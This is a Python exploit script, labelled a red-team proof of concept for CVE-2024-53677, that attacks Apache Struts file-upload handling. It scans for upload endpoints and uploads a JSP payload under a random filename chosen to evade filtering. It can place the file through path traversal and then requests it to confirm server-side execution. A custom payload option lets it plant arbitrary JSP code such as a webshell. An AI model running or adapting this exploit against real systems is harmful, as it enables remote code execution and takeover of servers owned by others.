import requests
import argparse
import random
import string
from urllib.parse import urljoin


def generate_random_filename(extension=".jsp"):
    """
    Generate a random filename to evade simple file filtering.
    """
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + extension


def upload_payload(target_url, upload_endpoint, payload, filename, custom_path=None):
    """
    Upload the payload file to the target endpoint with optional path traversal.
    """
    upload_url = urljoin(target_url, upload_endpoint)
    print(f"[INFO] Uploading payload to {upload_url}...")

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Connection": "close"
    }

    # Prepare the upload parameters
    upload_path = f"{custom_path}/{filename}" if custom_path else filename
    files = {
        "upload": (filename, payload, "application/octet-stream"),
        "uploadFileName": upload_path  # Add potential path traversal support
    }

    try:
        response = requests.post(upload_url, files=files, headers=headers, timeout=10)
        if response.status_code == 200:
            print(f"[SUCCESS] File '{filename}' uploaded successfully to {upload_path}.")
            return True
        elif response.status_code in [403, 401]:
            print(f"[WARNING] Upload blocked. HTTP {response.status_code}. Possible WAF or auth issue.")
        else:
            print(f"[ERROR] Upload failed. HTTP Status: {response.status_code}")
            print(f"[DEBUG] Response: {response.text[:200]}")
        return False
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Upload failed: {e}")
        return False


def verify_execution(target_url, filename, custom_path=None):
    """
    Verify if the uploaded payload is accessible and executed.
    """
    file_path = f"{custom_path}/{filename}" if custom_path else filename
    payload_url = urljoin(target_url, file_path)
    print(f"[INFO] Verifying payload execution at {payload_url}...")

    try:
        response = requests.get(payload_url, timeout=10)
        if response.status_code == 200 and "Exploit test successful!" in response.text:
            print(f"[ALERT] Exploit successful! Payload executed at: {payload_url}")
            return True
        elif response.status_code == 404:
            print(f"[INFO] File not found. Possible server-side restrictions.")
        else:
            print(f"[INFO] Unexpected response. HTTP Status: {response.status_code}")
            print(f"[DEBUG] Response: {response.text[:200]}")
        return False
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Verification failed: {e}")
        return False


def discover_endpoint(target_url):
    """
    Attempts to dynamically discover file upload endpoints.
    """
    print("[INFO] Attempting to discover common file upload endpoints...")
    common_endpoints = [
        "/fileUpload.action",
        "/upload.action",
        "/upload",
        "/struts2-showcase/fileUpload.action",
        "/s2vuls/upload",
        "/vulnerabilities/upload"
    ]

    for endpoint in common_endpoints:
        full_url = urljoin(target_url, endpoint)
        try:
            response = requests.options(full_url, timeout=5)
            if response.status_code in [200, 403]:
                print(f"[INFO] Potential upload endpoint found: {endpoint}")
                return endpoint
        except requests.exceptions.RequestException:
            continue
    print("[WARNING] No common upload endpoints detected.")
    return None


def main():
    parser = argparse.ArgumentParser(description="Red Team PoC Exploit for CVE-2024-53677")
    parser.add_argument("target_url", help="Target base URL (e.g., http://example.com)")
    parser.add_argument("--upload_endpoint", help="Path to the file upload endpoint")
    parser.add_argument("--payload", default="<% out.println('Exploit test successful!'); %>",
                        help="Custom JSP payload content (default prints a success message)")
    parser.add_argument("--filename", help="Custom filename for payload upload")
    parser.add_argument("--custom_path", help="Custom path for path traversal testing (e.g., '../../..')")
    args = parser.parse_args()

    print("[INFO] Starting CVE-2024-53677 Exploit...")
    target_url = args.target_url.rstrip("/")

    # Generate random filename if not specified
    filename = args.filename if args.filename else generate_random_filename()

    # Discover endpoint if not provided
    upload_endpoint = args.upload_endpoint
    if not upload_endpoint:
        upload_endpoint = discover_endpoint(target_url)
        if not upload_endpoint:
            print("[ERROR] Failed to discover upload endpoint. Exiting.")
            return

    # Upload payload
    if upload_payload(target_url, upload_endpoint, args.payload, filename, args.custom_path):
        # Verify execution
        verify_execution(target_url, filename, args.custom_path)
    else:
        print("[ERROR] Exploit attempt failed.")

    print("[INFO] Exploit process completed.")


if __name__ == "__main__":
    main()
